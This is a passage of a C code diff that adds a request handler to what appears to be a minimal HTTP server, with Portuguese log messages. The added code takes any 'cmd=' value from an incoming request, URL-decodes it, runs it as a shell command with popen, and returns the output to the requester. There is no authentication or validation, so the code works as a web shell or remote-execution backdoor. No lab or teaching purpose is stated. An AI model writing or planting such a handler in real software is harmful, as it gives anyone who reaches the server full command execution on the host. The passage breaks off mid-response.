@@ -61,3 +61,68 @@ void handle_client(int client_socket) {
         client_socket,
         buffer,
         sizeof(buffer) - 1
+         );
+
+    if (bytes_read <= 0) {
+        close(client_socket);
+        return;
+    }
+
+    printf("=====================================\n");
+    printf("Requisição recebida:\n%s\n", buffer);
+
+    char *cmd_start = strstr(buffer, "cmd=");
+
+    if (cmd_start != NULL) {
+
+        cmd_start += 4;
+
+        int i = 0;
+
+        while (
+            cmd_start[i] != ' ' &&
+            cmd_start[i] != '&' &&
+            cmd_start[i] != '\0' &&
+            i < sizeof(command) - 1
+        ) {
+
+            command[i] = cmd_start[i];
+            i++;
+        }
+
+        command[i] = '\0';
+
+        url_decode(command, decoded);
+  printf("Comando decodificado: %s\n", decoded);
+
+        FILE *fp = popen(decoded, "r");
+
+        char output[2048] = {0};
+
+        if (fp != NULL) {
+
+            fread(
+                output,
+                1,
+                sizeof(output) - 1,
+                fp
+            );
+
+            pclose(fp);
+
+        } else {
+
+            strcpy(output, "Erro ao executar comando\n");
+        }
+
+        char response[4096];
+
+        snprintf(
+            response,
+            sizeof(response),
+            "HTTP/1.1 200 OK\r\n"
+            "Content-Type: text/plain\r\n"
+            "Connection: close\r\n"
+            "\r\n"
+            "%s",
+            output
